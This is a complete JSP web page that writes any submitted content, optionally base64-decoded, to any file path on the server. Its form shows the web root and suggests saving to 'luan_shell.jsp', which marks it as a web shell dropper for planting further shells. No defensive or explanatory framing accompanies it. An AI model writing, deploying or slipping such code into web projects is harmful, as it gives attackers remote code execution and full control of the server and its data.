<%@ page import="java.util.*,java.io.*" pageEncoding="UTF-8" contentType="text/html; charset=utf-8"%>
<%
request.setCharacterEncoding("utf-8");
String filePath = request.getParameter("filePath");
String content = request.getParameter("content");
String base64Flag = request.getParameter("base64");
String msg = "";
if(content != null){
try{
File file = new File(filePath);
OutputStream os = new FileOutputStream(file);
byte[] bytes = null;
if("on".equals(base64Flag)){
bytes = new sun.misc.BASE64Decoder().decodeBuffer(content);
}else{
bytes = content.getBytes("utf-8");
}
os.write(bytes);
os.close();
msg = "success";
}catch(Exception e){
msg = "error";
}
}
%>
<font color="red"><%=msg%></font>
<form action="" method="post">
<table>
<tr>
<td>filepath:</td>
<td><%=application.getRealPath("")%></td>
</tr>
<tr>
<td>savepath:</td>
<td><input type="text" size="60" name="filePath" value="<%=application.getRealPath("/")+"luan_shell.jsp"%>"/><input type="checkbox" name="base64"/>base64 decode</td>
</tr>
<tr valign="top">
<td>content:</td>
<td><textarea rows="20" cols="70" name="content"></textarea></td>
</tr>
<tr align="right">
<td> </td>
<td><input type="submit" value="save"/></td>
</tr>
</table>
</form>